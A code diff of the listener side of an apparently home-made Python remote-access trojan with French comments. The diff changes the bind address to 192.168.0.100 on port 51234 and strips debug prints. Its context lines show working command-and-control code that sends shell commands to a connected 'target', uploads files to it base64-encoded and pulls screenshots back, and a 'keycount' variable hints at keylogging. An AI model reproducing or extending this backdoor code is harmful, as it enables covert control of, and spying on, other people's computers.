@@ -6,14 +6,11 @@ import json
 import base64
 from termcolor import colored
 
-localIP = "10.32.0.117"
+localIP = "192.168.0.100"
 portbind = 51234
 
 def reliable_send(data): #pour envoyer plus de 1024 bits
 	json_data = json.dumps(data.decode('cp850','replace'), ensure_ascii=False)
-	#print("json data : ")
-	#print(type(json_data.encode('cp850','replace'))) #on transforme le string en bytes
-	#print(json_data)
 	target.send(json_data.encode('cp850','replace'))
 
 def reliable_recv():
@@ -30,7 +27,6 @@ def shell():
 	global keycount
 	while True:
 		command = input(colored("@Shell: ",'white') + colored(str(ip),'blue') + colored("$ ",'white'))
-		#print(type(command))
 		reliable_send(command.encode('cp850','replace'))
 		if command == 'q':
 			break
@@ -45,9 +41,6 @@ def shell():
 			try:
 				with open(command[7:], "rb") as fin: #read bytes
 					send = base64.b64encode(fin.read())
-					#print(send)
-					#print("decode")
-					#print(base64.b64decode(send))
 					reliable_send(send)
 					print(colored("[+] Upload ended !",'green')) #plutot l'afficher qd c fini sur l'autre ordi
 			except:
@@ -56,11 +49,8 @@ def shell():
 				print(colored("[!!] Upload Failed",'red'))
 		elif command[:10] == "screenshot":
 			with open("screenshot%d.png" % count, "wb") as screen: #count va augmenter
-				#print "fichier open"
 				image = reliable_recv()
-				#print image
 				image_decoded = base64.b64decode(image)
-				#print "image decoded"
 				if image_decoded[:4] == "[!!]":
 					print(image_decoded) #car c ce qu'on revoie qd il y a une erreur
 				else:
